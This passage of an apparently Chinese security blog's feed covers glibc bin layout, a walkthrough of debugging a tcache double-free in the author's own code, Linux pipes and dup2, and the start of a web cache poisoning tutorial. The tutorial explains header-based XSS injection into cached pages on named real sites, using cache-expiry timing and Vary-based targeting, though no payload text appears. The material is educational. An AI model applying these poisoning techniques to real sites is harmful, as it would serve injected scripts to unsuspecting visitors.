last_remainder也即unsortedchunk的mchunk_size这个成员的起始地址</span><br><span class="line">0x7ffff7dcfca0 topchunk ptr ｜ last_remainder</span><br><span class="line">0x7ffff7dcfcb0 unsortedbins fd | unsortedbins bk</span><br><span class="line">0x7ffff7dcfcc0 unsortedbins fd_nextsize  | unsortedbins bk_nextsize</span><br><span class="line">0x7ffff7dcfcd0 samllbins[0] mchunk_prev_size | samllbins[0] mchunk_size</span><br><span class="line">0x7ffff7dcfce0 samllbins[0] fd | samllbins[0] bk</span><br><span class="line">0x7ffff7dcfcf0 samllbins[0] fd_nextsize | samllbins[0] bk_nextsize</span><br></pre></td></tr></table></figure><p>合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// unsortedbins的实际头起始处由于是topchunk ptr和last_remainder，所以是特例</span></span><br><span class="line"><span class="comment">// 这也是为何没有索引为0的bin(实际我觉得这就是代码实现上的区别。。这里就不深究为何没有0了)</span></span><br><span class="line"><span class="number">0x7ffff7dcfca0</span> topchunk ptr ｜ last_remainder </span><br><span class="line"><span class="number">0x7ffff7dcfcb0</span> unsortedbins fd | unsortedbins bk &lt;- 这里维持不动</span><br><span class="line"><span class="number">0x7ffff7dcfcc0</span> unsortedbins fd_nextsize  | unsortedbins bk_nextsize &lt;-这里是没有用的空间</span><br><span class="line"><span class="number">0x7ffff7dcfcd0</span> samllbins[<span class="number">0</span>] mchunk_prev_size | samllbins[<span class="number">0</span>] mchunk_size &lt;- 这里也没有用,所以把两者合并，并把smallbins[<span class="number">0</span>]上移</span><br><span class="line"><span class="number">0x7ffff7dcfce0</span> samllbins[<span class="number">0</span>] fd | samllbins[<span class="number">0</span>] bk</span><br><span class="line"><span class="number">0x7ffff7dcfcf0</span> samllbins[<span class="number">0</span>] fd_nextsize | samllbins[<span class="number">0</span>] bk_nextsize</span><br><span class="line">                                ｜</span><br><span class="line">                                ｜</span><br><span class="line">                                ｜</span><br><span class="line">                                \/</span><br><span class="line"><span class="comment">// 合并上移完成后，接着由于0x7ffff7dcfcc0处实际上也是没用的，所以将samllbins[0]再次上移</span></span><br><span class="line"><span class="number">0x7ffff7dcfca0</span> topchunk ptr ｜ last_remainder </span><br><span class="line"><span class="number">0x7ffff7dcfcb0</span> unsortedbins fd | unsortedbins bk</span><br><span class="line">0x7ffff7dcfcc0 unsortedbins fd_nextsize(samllbins[0] mchunk_prev_size)  | unsortedbins bk_nextsize(samllbins[0] mchunk_size)</span><br><span class="line"><span class="number">0x7ffff7dcfcd0</span> samllbins[<span class="number">0</span>] fd | samllbins[<span class="number">0</span>] bk</span><br><span class="line"><span class="number">0x7ffff7dcfce0</span> samllbins[<span class="number">0</span>] fd_nextsize | samllbins[<span class="number">0</span>] bk_nextsize</span><br><span class="line"><span class="number">0x7ffff7dcfcf0</span> <span class="literal">NULL</span> | <span class="literal">NULL</span></span><br><span class="line">                                ｜</span><br><span class="line">                                ｜</span><br><span class="line">                                ｜</span><br><span class="line">                                \/</span><br><span class="line"><span class="comment">// samllbins[0] fd | samllbins[0] bk占据0x7ffff7dcfcc0处开始的16个字节</span></span><br><span class="line"><span class="comment">// 此时samllbins[0]的实际头起始地址已经抬高两次，从0x7ffff7dcfcd0-&gt;0x7ffff7dcfcc0-&gt;0x7ffff7dcfcb0</span></span><br><span class="line"><span class="comment">// 所以当bin_at宏查找索引为2的samllbins[0]起始地址时，返回的是0x7ffff7dcfcb0</span></span><br><span class="line"><span class="number">0x7ffff7dcfca0</span> topchunk ptr ｜ last_remainder </span><br><span class="line"><span class="number">0x7ffff7dcfcb0</span> unsortedbins fd | unsortedbins bk</span><br><span class="line"><span class="number">0x7ffff7dcfcc0</span> samllbins[<span class="number">0</span>] fd | samllbins[<span class="number">0</span>] bk</span><br><span class="line"><span class="number">0x7ffff7dcfcd0</span> samllbins[<span class="number">0</span>] fd_nextsize | samllbins[<span class="number">0</span>] bk_nextsize</span><br><span class="line"><span class="number">0x7ffff7dcfce0</span> <span class="literal">NULL</span> | <span class="literal">NULL</span></span><br><span class="line"><span class="number">0x7ffff7dcfcf0</span> <span class="literal">NULL</span> | <span class="literal">NULL</span></span><br></pre></td></tr></table></figure><p>所以简单来说，我们可以认为<code>malloc_state</code>中<code>bins</code>成员实际上存储的确实是指向双向链表头尾的指针，但是存储的每一对指针实际上是其对应索引的bin的头节点的<code>fd</code>与<code>bk</code>成员，而不是我们误认为的对应索引的bin的头节点的起始地址</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>learn pwn,and be well</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Double free</title>
      <link href="Double-free.html"/>
      <url>Double-free.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>仅记录自己调试程序的一个double free漏洞的问题</p><h1 id="Tcachebins"><a href="#Tcachebins" class="headerlink" title="Tcachebins"></a>Tcachebins</h1><p>对于稍微了解linux堆内存管理的人来说，fastbins这个词一定不陌生，而在libc2.26之后，一个新的机制 <strong>Tcachebins</strong>被引入了，Tcachebins和fastbins很像，但优先级在fastbins之前。</p><p>被free的适当大小的内存块会优先被放入Tcachebins，且Tcachebins的每一个链上可以最多链接7个堆块，只有当Tcachebins满了之后，再free的内存块才会被放入fastbins及unsorted bins</p><p>在malloc时，也会优先取Tcachebins中的内存块</p><p>Tcachebins和fastbins一样，仅基于fd指针构造单链表，且遵循LIFO的原则</p><h1 id="ptmalloc堆结构"><a href="#ptmalloc堆结构" class="headerlink" title="ptmalloc堆结构"></a>ptmalloc堆结构</h1><p>如下图所示：</p><p><img src="/image/doubleFree/heap.jpg" alt="heap"></p><p>在图中，prev_size以及size构成了chunk头：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.prev_size    只有在前一个堆块是空闲时才会有值，用来指示前一个堆块的大小</span><br><span class="line">2.size         当前chunk的大小（包括chunk header的长度）。由于chunk大小是8的整数倍，所以此size的后3 bit被用于存储其他信息</span><br></pre></td></tr></table></figure><p>prev_size与size分别占据8字节的长度，即chunk头为0x10长.</p><p>prev_size所占据的8个字节在prev chunk处在in-use的情况下是无用的，可以被prev chunk使用</p><p>size的后三bit有特殊用途，被用于存储其他信息,如下图所示：</p><p><img src="/image/doubleFree/chunkheader.jpg" alt="chunkheader"></p><p>这三位的作用是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.NON_MAIN_ARENA     这个堆块是否位于主线程</span><br><span class="line">2.IS_MAPPED          记录当前 chunk 是否是由 mmap 分配的</span><br><span class="line">3.PREV_INUSE         记录前一个 chunk 块是否被分配</span><br></pre></td></tr></table></figure><p>如果当前chunk处于未被使用状态，则mem前8 bytes被用来存储其他信息，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd:     下一个未被使用的chunk的地址</span><br><span class="line">bk:     上一个未被使用的chunk的地址</span><br></pre></td></tr></table></figure><p>一般我们使用void *x = malloc(1)，获得的指针地址指向的是fd的开头，chunk header为ptmalloc自动分配</p><p>另外，在malloc时，根据操作系统的位数，有一个最小分配空间的概念，在64位上=16字节，32位=8字节，即哪怕malloc(0)，也会按照最小值分配</p><h1 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h1><h2 id="下断点至第一次free"><a href="#下断点至第一次free" class="headerlink" title="下断点至第一次free"></a>下断点至第一次free</h2><p><img src="/image/doubleFree/firstfree.jpg" alt="firstfree"></p><p>此时，tcache如下图所示</p><p><img src="/image/doubleFree/firstfree-tcache.jpg" alt="firstfree-tcache"></p><p>moduleNameBuff指向的地址内容如下所示：</p><p><img src="/image/doubleFree/firstfree-mnb.jpg" alt="firstfree-mnb"></p><h2 id="第一次free后"><a href="#第一次free后" class="headerlink" title="第一次free后"></a>第一次free后</h2><p><img src="/image/doubleFree/afterfirstfree-code.jpg" alt="afterfirstfree-code"></p><p>tacache如下所示：</p><p><img src="/image/doubleFree/afterfirstfree-tcache.jpg" alt="afterfirstfree-tcache"></p><p>原moduleNameBuff所指向的地址(0x55555575ecd0)，这里-0x10是为了指向chunk头</p><p><img src="/image/doubleFree/afterfirstfree-mnb.jpg" alt="afterfirstfree-mnb"></p><p>可以看到对应上面提到的堆结构，fd指针已经指向了tcachebins中的下一块未被使用的堆地址(0x000055555575ed70)</p><h2 id="下断点并运行至第二次free"><a href="#下断点并运行至第二次free" class="headerlink" title="下断点并运行至第二次free"></a>下断点并运行至第二次free</h2><p><img src="/image/doubleFree/secondfree-code.jpg" alt="secondfree-tcache"></p><p>此时tcache如下图所示：</p><p><img src="/image/doubleFree/secondfree-tcache.jpg" alt="secondfree-tcache"></p><p>地址0x55555575ecd0-0x10如下所示：</p><p><img src="/image/doubleFree/secondfree-mnb.jpg" alt="secondfree-mnb"></p><p>此时可以看到，由于4-5步之间我还进行了其他的操作，所以导致tcache链上增加了其他的几个空闲块，且此时将要被double free的内存块并未有异常</p><h2 id="第二次free后"><a href="#第二次free后" class="headerlink" title="第二次free后"></a>第二次free后</h2><p><img src="/image/doubleFree/aftersecondfree-code.jpg" alt="aftersecondfree-code"></p><p>此时tcache如下所示：</p><p><img src="/image/doubleFree/aftersecondfree-tcache.jpg" alt="aftersecondfree-tcache"></p><p>此时地址0x55555575ecd0-0x10如下所示：</p><p><img src="/image/doubleFree/aftersecondfree-mnb.jpg" alt="aftersecondfree-mnb"></p><p>可以看到，tcache显示loop detected，并且被double free的0x55555575ecd0这一堆块的fd指针指向了0x000055555575edd0，即tcache中显示的下一个空闲堆块</p><p>而0x000055555575edd0所指向的堆块如下所示：</p><p><img src="/image/doubleFree/aftersecondfree-another.jpg" alt="aftersecondfree-another"></p><p>可以看到此时0x000055555575edd0所指向的堆块中fd为0x55555575ecd0，那么这也就可以解释loop出现的原因，0x55555575ecd0与0x000055555575edd0中的fd互相指向，形成了一个循环，这是不应当的</p><h2 id="跳至“第一块”0x55555575ecd0被分配"><a href="#跳至“第一块”0x55555575ecd0被分配" class="headerlink" title="跳至“第一块”0x55555575ecd0被分配"></a>跳至“第一块”0x55555575ecd0被分配</h2><p>此时double free的问题还没有显现出来</p><p><img src="/image/doubleFree/first-ecd-code.jpg" alt="first-ecd-code"></p><p>此时tcache如下所示：</p><p><img src="/image/doubleFree/firstalloc-ecd-tcache.jpg" alt="firstalloc-ecd-tcache"></p><p>0x000055555575edd0和0x55555575ecd0堆块如下所示：</p><p><img src="/image/doubleFree/firstalloc-ecd-twoheap.jpg" alt="firstalloc-ecd-twoheap"></p><p>可以看到，断点下到了即将执行malloc的代码处，申请的堆空间为4字节，加上头长为0x14，故而分配0x20size的堆块，此时tcache显示下一个即将被分配的0x20size的堆块为被我们double free的”第一块”0x55555575ecd0</p><h2 id="准备填入数据"><a href="#准备填入数据" class="headerlink" title="准备填入数据"></a>准备填入数据</h2><p>当“第一块”0x55555575ecd0被分配给data_len后，我准备向这个堆块中填入数据</p><p><img src="/image/doubleFree/rec-data-first-ecd-code.jpg" alt="rec-data-first-ecd-code"></p><p> 此时0x000055555575edd0和0x55555575ecd0堆块如下所示：</p><p><img src="/image/doubleFree/rec-data-first-twoheap.jpg" alt="rec-data-first-twoheap"></p><p>tcache如下所示：</p><p><img src="/image/doubleFree/rec-data-first-tcache.jpg" alt="rec-data-first-tcache"></p><p>可以看到，我准备向0x55555575ecd0指向的堆块中写入四个字节的数据，而且此时0x000055555575edd0和0x55555575ecd0堆块以及tcache并没有变动</p><h2 id="填入数据"><a href="#填入数据" class="headerlink" title="填入数据"></a>填入数据</h2><p><img src="/image/doubleFree/rec-data-first-done-code.jpg" alt="rec-data-first-done-code"></p><p>此时tcache：</p><p><img src="/image/doubleFree/rec-data-first-done-tcache.jpg" alt="rec-data-first-done-tcache"></p><p>此时0x000055555575edd0和0x55555575ecd0堆块：</p><p><img src="/image/doubleFree/rec-data-first-done-twoheap.jpg" alt="rec-data-first-done-twoheap"></p><p>可以看到，我向0x55555575ecd0指向的堆块中的低四字节写入了0x00000001,而此时由于0x55555575ecd0被tcache误认为仍是空闲堆块(还存在在tcache的链上)，故而在tcache看来，0x55555575ecd0所指向的堆块的头八个字节应当是fd，即指向下一个空闲堆块，故而误将我写入后的四字节+原本的四字节当作了下一个空闲堆块的地址，即0x0000555510000000，而这个地址是无法访问的，从tcache也可以看出，其误将0x0000555510000000作为了“第二个”0x55555575ecd0后的空闲堆块，由于无法访问这一个地址，故而显示<code>[Corrupted chunk at 0x555510000000]</code></p><p>实际上我这里还有一个错误，就是在data_len使用完后并没有立即释放，故而0x55555575ecd0所指向的堆块在之后的程序中会一直呈现被占用的状态，不会再有指针去修改其中的数据，这也代表着Corrupted chunk像一个定时炸弹一样，等待其被分配的那一刻</p><p>不过就算我立即free了data_len，随后仍有可能会有其他的指针获得0x55555575ecd0指向的堆块并修改其中的数据，将0x0000555510000000改为其他的值，继续维持异常的状态，导致同样的崩溃</p><h2 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h2><p>跳至等到所有排在Corrupted chunk之前的堆块都被分配后</p><p><img src="/image/doubleFree/boooom-code.jpg" alt="boooom-code"></p><p>此时tcache：</p><p><img src="/image/doubleFree/boooom-tcache.jpg" alt="boooom-tcache"></p><p>此时0x000055555575edd0和0x55555575ecd0堆块：</p><p><img src="/image/doubleFree/boooom-twoheap.jpg" alt="boooom-twoheap"></p><p>可以看见即将要执行malloc(4)的操作，对应0x20size的堆块，而在tcache中显示下一块即将被分配的0x20size的堆块为<code>Corrupted chunk</code>，故而在此句程序结束后，程序崩溃，并抛出了错误<code>Program received signal SIGSEGV, Segmentation fault.</code></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>实际上，这样的漏洞进一步可以导致<code>write-anything-anywhere</code>问题，而且当写入的内容可以由外部决定时(例如从socket上获取数据)尤为严重，配合其他的漏洞就有可能形成攻击链。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux中的pipe与fd</title>
      <link href="linux-fd.html"/>
      <url>linux-fd.html</url>
      
        <content type="html"><![CDATA[<h1 id="Pipe"><a href="#Pipe" class="headerlink" title="Pipe"></a>Pipe</h1><p>我们经常能看到如下的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int pipefd[2];</span><br><span class="line">int status &#x3D; pipe(pipefd);</span><br><span class="line">if(status&#x3D;&#x3D;-1)&#123;</span><br><span class="line">  printf(&quot;create pipe erro\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">...fork()....</span><br><span class="line">&#x2F;&#x2F;child</span><br><span class="line">dup2(pipefd[0], STDIN_FILENO);</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>(这边省略了父子进程close无用fd的代码，要close这些无用fd，参看下面的讲解)</p><p>上面这段代码首先定义了一对pipe的fd，初始化这对pipe，并在fork后的子进程中将子进程的标准输入重定向至pipefd[1]</p><p>在理解上面的含义之前，其实我应当声明一些重要的概念，首先是在声明初始化一对pipe时，默认pipefd[1]是数据流入端，而pipefd[0]是数据流出端，并且，pipe是单向的，永远从pipefd[1] –&gt; pipefd[0]</p><p>另外，以下这部分代码经常引起疑惑(大概)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dup2(pipefd[0], STDIN_FILENO);</span><br></pre></td></tr></table></figure><p>因为上面说过，pipefd[0]是数据流出端，那为啥<strong>标准输入</strong>会与pipefd[0]打上交道呢？一个<strong>输入</strong>，一个<strong>流出</strong>，感觉貌似弄反了。</p><p>但实际上，并不是如此，因为如果你细细看过dup2的实现你会发现，dup2函数的原型是int dup2(int fd,int fd2)，其实现的功能就是：对于fd2，可以用fd参数指定fd2的值。如果fd2已经打开，则先将其关闭。如若fd等于fd2，则dup2返回fd2，而不关闭它。否则，fd2的FD_CLOEXEC文件描述符标志就被清楚，这样fd2在进程调用exec时是打开状态。</p><p>那这里面实际上最重要的，就是这个<strong>关闭</strong>是啥意思</p><p>实际上，我们可以把fd看成一个连线图的感觉，举例来说，原先STDIN_FILENO指向的是键盘，也就是我们所谓的标准输出，但是，如果经过上面的代码，那么STDIN_FILENO将会取消指向键盘，转而指向pipefd[0]所指向的管道的0端，所以此时只要是管道的0端<strong>流出的任何东西</strong>都将会成为STDIN_FILENO所<strong>接受的输入</strong></p><p>看到这儿，基本能解释“弄反”的疑惑了，反之同理，如下的代码将表示STDOUT_FILENO以及STDERR_FILENO所<strong>输出的任何东西</strong>将变为管道的1端(pipefd[1]指向的就是管道的1端)所<strong>流入的任何东西</strong></p><p>(管道的0端和1端可以看下面的抽象图形)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dup2(pipefd[1],STDOUT_FILENO);</span><br><span class="line">dup2(pipefd[1],STDERR_FILENO);</span><br></pre></td></tr></table></figure><p>那管道呢，实际上我们可以将其抽象为这样一个图形：</p><p>pipe :           pipefd[1]–指向–&gt;1———数据流转———&gt;0&lt;–指向–pipefd[0]</p><p>而所谓的dup2(pipefd[0], STDIN_FILENO)，也就是这样：</p><p>更改后：        pipefd[1]–指向–&gt;1———数据流转———&gt;0&lt;–指向–(pipefd[0],STDIN_FILENO)  </p><p>(注意:这里写在一起只是因为不方便画图，实际上pipefd[0]，STDIN_FILENO是<strong>分别</strong>指向管道的0端，并不是STDIN_FILENO先指向pipefd[0]，pipefd[0]再指向管道的0端，这很关键！是分叉而不是直线!)</p><p>而一般我们在子进程中调用完<code>dup2(pipefd[0], STDIN_FILENO);</code>后会调用<code>close(pipefd[0])</code>，让pipefd[0]不再指向0，从而将管道变为这样：</p><p>pipe :           pipefd[1]–指向–&gt;1———数据流转———&gt;0&lt;–指向–STDIN_FILENO</p><p>这时，父进程只需要向pipefd[1]中写入数据，就会通过管道，写入至子进程的STDIN_FILENO中了</p><p>但是这里要注意了，务必要在调用完<code>dup2(pipefd[0], STDIN_FILENO);</code>之后再调用<code>close(pipefd[0])</code>，切不可倒过来，因为一旦倒过来，先取消了pipefd[0]与管道0端的绑定，那么STDIN_FILENO将无法与管道0端进行绑定!(其实就有点pipefd[0]把自己的绑定信息“拷贝”给STDIN_FILENO的感觉，如果自己绑定信息被清空，那么自然也就无法“拷贝”给STDIN_FILENO了，意思是这么个意思，不想深究其原理的话大致可以粗浅的这么认为)</p><p>另外还有一点需要提一下，那就是如果在fork之前执行了dup2函数，那么fork后的子进程依然会继承父进程dup2函数所带来的影响，换句话说，就是继承相同的fd表。那么如果上面的dup2语句放在了fork前执行，那么管道会变成这样：</p><p>pipe :           pipefd[1]–指向–&gt;1———数据流转———&gt;0&lt;–指向–(父-STDIN_FILENO,子-STDIN_FILENO）</p><p>那么此时可以发现，有两个标准输入都指向了同一条管道的0端，那么为了防止由1端输入的数据被错误进程的标准输入读走，我们必须在读出数据前取消其中一个STDIN_FILENO与此管道的绑定</p><p>如果说我们希望子进程来读，那么在fork之后，父进程必须记得执行close(0),取消自己的标准输入与管道的绑定，让管道变成如下这样：</p><p>pipe :           pipefd[1]–指向–&gt;1———数据流转———&gt;0&lt;–指向–子-STDIN_FILENO</p><p>这样的话，父进程向pipefd[1]中写入数据，就能保证一定会被子进程的标准输入所捕获了，所以由此可得，我们在使用一条管道时，<strong>务必保证指向管道1端以及指向管道0端的fd分别有且仅有一个</strong>，不然程序可能会出现预期之外的行为</p><p>最后，因为管道是单向的，所以如果我们还希望将子进程的输出由父进程捕获，那么我们就还需要另一条管道，用来使子进程向父进程传输数据</p><p>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int pipefd[2];</span><br><span class="line">int pipefd2[2];</span><br><span class="line">int status &#x3D; pipe(pipefd);</span><br><span class="line">if(status&#x3D;&#x3D;-1)&#123;</span><br><span class="line">  printf(&quot;create pipe erro\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int status2 &#x3D; pipe(pipefd2);</span><br><span class="line">if(status2&#x3D;&#x3D;-1)&#123;</span><br><span class="line">  printf(&quot;create pipe erro\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">...fork()....</span><br><span class="line">&#x2F;&#x2F;child</span><br><span class="line">dup2(pipefd[0], STDIN_FILENO);</span><br><span class="line">dup2(pipefd2[1],STDOUT_FILENO);</span><br><span class="line">dup2(pipefd2[1],STDERR_FILENO);</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>(这边省略了父子进程close无用fd的代码，要close这些无用fd，参看上面的讲解，是一个意思)</p><p>这样，子进程的输出将会自动写入pipefd2[1]，父进程只需要根据需要，读出pipefd2[0]的数据即可实现子—-&gt;父的通讯过程</p><p>另外，还有个小tip，就是有时候我们会无限循环地读管道地数据流出端(即0端)，那么我们该如何退出这个死循环，就像go中close channel一样，让读出端能够感知管道已经被废弃，从而结束”读“任务呢？</p><p>要完成以上的目标，我们所需要做的，就是将1端，即数据输入端的引用计数变为0，也即相当于我们上面所提到的，取消所有fd与管道数据输入端的绑定，当输入端的引用计数变为0时，读取者将会读到0，此时通过判断数据长度是否为0就可以退出循环</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>其实管道的内部实现是很复杂的，linux的管道机制要深究起来能写一本书。。。以后有空还是要多研究总结，不然老是记混 👻</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> code </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB缓存投毒攻击技术</title>
      <link href="Web-Cache-Poisoning.html"/>
      <url>Web-Cache-Poisoning.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>老规矩,还是要简单介绍一下这个技术，实际上这个技术和我之前总结的HTTP Smuggling一样，属于比较”冷门”的漏洞，在大家热衷于寻找RCE、XSS、Sql injection的今天，此漏洞看似“垂垂老矣”，其复杂的攻击方式及“理论上的”威胁实在难以得到安全研究人员的青睐</p><p>但是实际上，还是老话，没有无用的，只有你不会的～</p><p>简单说，Web Cache Posioning旨在欺骗网站缓存，尝试劫持缓存服务器，使其缓存错误的资源，从而导致其后一系列如：DOS，XSS等等的攻击</p><p>那我们就来详细聊一聊这个“孤独”的攻击手法吧</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>由于Web Cache Posioning这种攻击手段与缓存有着很大的关联，所以首先，需要先熟悉一下缓存的基本原理</p><p>下图可以简单了解缓存的原理:</p><p><img src="/image/Web-Cache-Poisoning/cache.jpg" alt="cache"></p><p>简单来说，就是当一个用户访问了例如/static/test.png这一资源后，Cache服务将会缓存(如果是可缓存的话)这一资源，当之后再有用户访问相同的资源时，Cache服务将不会转发此请求至后端服务器，而是直接将其保存的对应的数据返回。</p><p>听起来是不是很简单？这也是我们经常使用的CDN的最为基本的原理</p><p>但是，作为一个安全人员，在上面这句话中，总也能嗅到一丝危险的味道，“不会转发”、“直接返回”这样的字眼往往蕴含着巨大的风险</p><p>而Web Cache Posioning就是基于这些字眼而发起的攻击，我们的目标就是欺骗前端的缓存服务器，让其误认为受害者与攻击者访问的是同一个资源，从而在不请示后端服务器的情况下，误把被攻击者污染后的资源文件提供给受害者。</p><p><img src="/image/Web-Cache-Poisoning/cache-posioning.jpg" alt="cache-posioning"></p><p>对于缓存服务器，如果其判断是否是<strong>同一个资源</strong>的规则是基于url以及host头时，那么缓存服务器将简单地认为下两个请求是等同的</p><p><img src="/image/Web-Cache-Poisoning/first-request.jpg" alt="first-request"></p><p><img src="/image/Web-Cache-Poisoning/second-request.jpg" alt="second-request"></p><p>可以看到，橙色字体将是缓存服务器判断的根据，所以缓存服务器将会把第一个请求的响应拿来作为第二个请求的响应</p><p>但是我们可以看到，蓝色字体部分，两个请求所请求的文本语言是不一样的，故而这样的话，缓存服务器就“错误”地为第二个用户提供了错误语言版本的响应</p><p>在某种程度上，这就是最简单的(也是不太可能出现的)“欺骗”</p><p>但，事情从此才开始有趣了起来(笑)</p><h1 id="手法"><a href="#手法" class="headerlink" title="手法"></a>手法</h1><p>那么问题来了，我们应当如何有效的“欺骗”缓存服务器呢？</p><p>首先，我之前所讨论的HTTP Smuggling技术，其实就是可以完成这一操作的，如果想不明白，可以回过头看看那篇文章</p><p>当然了，我不会重复讨论同样的手法，所以这里要讲的，是另一种，更为有效，也更为直接的手法，即利用HTTP包头的解释歧义来进行缓存毒化</p><p>详细看看吧</p><h2 id="基础入门"><a href="#基础入门" class="headerlink" title="基础入门"></a>基础入门</h2><p>这里将会举一个redhat.com的真实例子</p><p>在redhat.com的一个页面上，我们发现了一个特殊的标头，如下图所示：</p><p><img src="/image/Web-Cache-Poisoning/redhat-before.jpg" alt="redhat-before"></p><p>可以看见如果我们在请求中带入X-Forwarded-Host标头，那么此标头的值将被用来在meta标签里生成url，那么如果试试xss呢？</p><p><img src="/image/Web-Cache-Poisoning/redhat-after.jpg" alt="redhat-after"></p><p>可以发现，并未做任何过滤，我们的X-Forwarded-Host的值直接被带入了meta标签，造成了XSS</p><p>那么，这个界面是否会被CDN缓存呢？</p><p>这时我们打开无痕浏览，模拟受害者，再次访问这个页面</p><p><img src="/image/Web-Cache-Poisoning/redhat-result.jpg" alt="redhat-result"></p><p>可以看见，我们成功的让CDN缓存了这个界面，所有访问这一页面的用户将会在不知情的情况下遭受XSS攻击</p><h2 id="变得更为谨慎"><a href="#变得更为谨慎" class="headerlink" title="变得更为谨慎"></a>变得更为谨慎</h2><p>上面我们成功的毒化了<a href="https://www.redhat.com/en?dontpoisoneveryone=1">https://www.redhat.com/en?dontpoisoneveryone=1</a>, 但是，当我们想要毒化类似<a href="https://www.redhat.com/en">https://www.redhat.com/en</a> 这样的链接时，我们将会遇到很多困难，最主要就是由于这种链接的访问流量将会很大，攻击者很难保证自己的请求能在缓存过期时精确的成为第一个到达的请求，而光靠暴力的方式往往会消耗大量的资源却无法得到预期的结果</p><p>所以，我们需要抓住一切我们可以利用的细节，尝试缩小我们尝试毒化的时间窗口</p><p>就像在unity3d.com中，我们可以发现如下的场景</p><p><img src="/image/Web-Cache-Poisoning/unity3d.jpg" alt="unity3d"></p><p>从图中可以看到，可以使用X-Host标头向网页中注入数据</p><p>另外，可以看见在响应中包含有Age和Cache-Control标头，其中Age标头代表此缓存已经被记录了多少秒，而Cache-control标头表示了过期时间，这里是1800秒</p><p>基于以上的信息，攻击者就可以大大缩小尝试攻击的时间窗口，降低时间成本</p><p>当然了，很多时候大部分网站并没有unity3d这么“友善”，这也是此类攻击技术难以大规模应用的一个原因</p><h2 id="精准投放"><a href="#精准投放" class="headerlink" title="精准投放"></a>精准投放</h2><p>当缓存服务器将UA作为缓存键的一部分时，我们就可以实现对某一类用户的精准毒化</p><p><img src="/image/Web-Cache-Poisoning/vary.jpg" alt="vary"></p><p>从图中可以看到，服务器的响应中包含了vary头，vary头代表了服务器将会以何键作为判断的标准，在这里，UA以及AE头即是判断的标准</p><p>所以，我们便可以对某类UA头进行毒化，实现精准投放</p><h2 id="DOM毒化"><a href="#DOM毒化" class="headerlink" title="DOM毒化"></a>DOM毒化</h2><p>当然了，也不是所有的毒化都像第一个例子一样那么轻松惬意地植入XSS的payload，又或者说，缓存服务器会有一些“额外”的特殊行动</p><p>就比如如下这种</p><p><img src="/image/Web-Cache-Poisoning/dom1.jpg" alt="dom1"></p><p>可以看到我们可以利用X-Forwarded-Host头注入一个自定义的域名</p><p>然后我们发现，此页面调用了data.host用来加载一个外部json</p><p><img src="/image/Web-Cache-Poisoning/dom2.jpg" alt="dom2"></p><p>json包含的内容如下所示</p><p><img src="/image/Web-Cache-Poisoning/dom3.jpg" 